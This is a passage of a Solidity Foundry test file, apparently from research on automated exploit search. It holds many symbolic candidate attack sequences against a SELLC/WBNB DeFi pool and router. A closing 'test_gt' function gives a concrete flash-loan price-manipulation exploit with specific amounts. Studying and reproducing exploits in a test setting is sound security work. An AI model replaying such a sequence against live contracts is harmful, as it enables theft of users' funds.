        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        deposit_srouter_wbnb_sellc(amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        deposit_srouter_wbnb_sellc(amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand150(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        deposit_srouter_wbnb_sellc(amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        swap_pair_attacker_wbnb_sellc(amt8, amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand151(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        deposit_srouter_wbnb_sellc(amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        deposit_srouter_wbnb_sellc(amt8);
        payback_sellc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand152(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        swap_pair_attacker_wbnb_sellc(amt9, amt10);
        payback_sellc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand153(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        deposit_srouter_wbnb_sellc(amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand154(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        swap_pair_attacker_wbnb_sellc(amt8, amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand155(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        deposit_srouter_wbnb_sellc(amt8);
        payback_sellc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand156(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        deposit_srouter_wbnb_sellc(amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        swap_pair_attacker_wbnb_sellc(amt8, amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand157(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        deposit_srouter_wbnb_sellc(amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        deposit_srouter_wbnb_sellc(amt8);
        payback_sellc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand158(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        deposit_srouter_wbnb_sellc(amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        payback_sellc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand159(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        deposit_srouter_wbnb_sellc(amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        deposit_srouter_wbnb_sellc(amt7);
        payback_sellc_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand160(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        swap_pair_attacker_wbnb_sellc(amt9, amt10);
        payback_sellc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand161(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        deposit_srouter_wbnb_sellc(amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand162(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        swap_pair_attacker_wbnb_sellc(amt8, amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand163(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        deposit_srouter_wbnb_sellc(amt8);
        payback_sellc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand164(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        deposit_srouter_wbnb_sellc(amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        swap_pair_attacker_wbnb_sellc(amt8, amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand165(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        deposit_srouter_wbnb_sellc(amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        deposit_srouter_wbnb_sellc(amt8);
        payback_sellc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand166(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        deposit_srouter_wbnb_sellc(amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        deposit_srouter_wbnb_sellc(amt8);
        swap_pair_attacker_wbnb_sellc(amt9, amt10);
        payback_sellc_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand167(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        deposit_srouter_wbnb_sellc(amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        payback_sellc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand168(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        deposit_srouter_wbnb_sellc(amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        deposit_srouter_wbnb_sellc(amt7);
        payback_sellc_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand169(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        deposit_srouter_wbnb_sellc(amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        deposit_srouter_wbnb_sellc(amt7);
        swap_pair_attacker_wbnb_sellc(amt8, amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand170(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        swap_pair_attacker_wbnb_sellc(amt8, amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand171(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        deposit_srouter_wbnb_sellc(amt8);
        payback_sellc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand172(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        payback_sellc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand173(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        deposit_srouter_wbnb_sellc(amt7);
        payback_sellc_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand174(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        payback_sellc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand175(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        deposit_srouter_wbnb_sellc(amt7);
        payback_sellc_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand176(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        deposit_srouter_wbnb_sellc(amt7);
        swap_pair_attacker_wbnb_sellc(amt8, amt9);
        payback_sellc_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand177(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        payback_sellc_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand178(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        deposit_srouter_wbnb_sellc(amt6);
        payback_sellc_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand179(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        deposit_srouter_wbnb_sellc(amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        payback_sellc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        emit log_named_uint("amt0", 428 ether);
        borrow_wbnb_owner(428 ether);
        printBalance("After step0 ");
        emit log_named_uint(
            "amt1",
            (wbnb.balanceOf(address(attacker)) * 99) / 100
        );
        emit log_named_uint("amt2", 5000000 ether);
        swap_pair_attacker_wbnb_sellc(
            (wbnb.balanceOf(address(attacker)) * 99) / 100,
            5000000 ether
        );
        printBalance("After step1 ");
        emit log_named_uint("amt3", 4 ether);
        deposit_srouter_wbnb_sellc(4 ether);
        printBalance("After step2 ");
        emit log_named_uint("amt4", sellc.balanceOf(address(attacker)));
        emit log_named_uint(
            "amt5",
            pair.getAmountOut(
                sellc.balanceOf(address(attacker)),
                address(sellc)
            )
        );
        swap_pair_attacker_sellc_wbnb(
            sellc.balanceOf(address(attacker)),
            pair.getAmountOut(
                sellc.balanceOf(address(attacker)),
                address(sellc)
            )
        );
        printBalance("After step3 ");
        emit log_named_uint("amt6", 0);
        withdraw_srouter_sellc_wbnb(0);
        printBalance("After step4 ");
        emit log_named_uint("amt7", 428 ether);
        payback_wbnb_owner(428 ether);
        printBalance("After step5 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        payback_wbnb_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
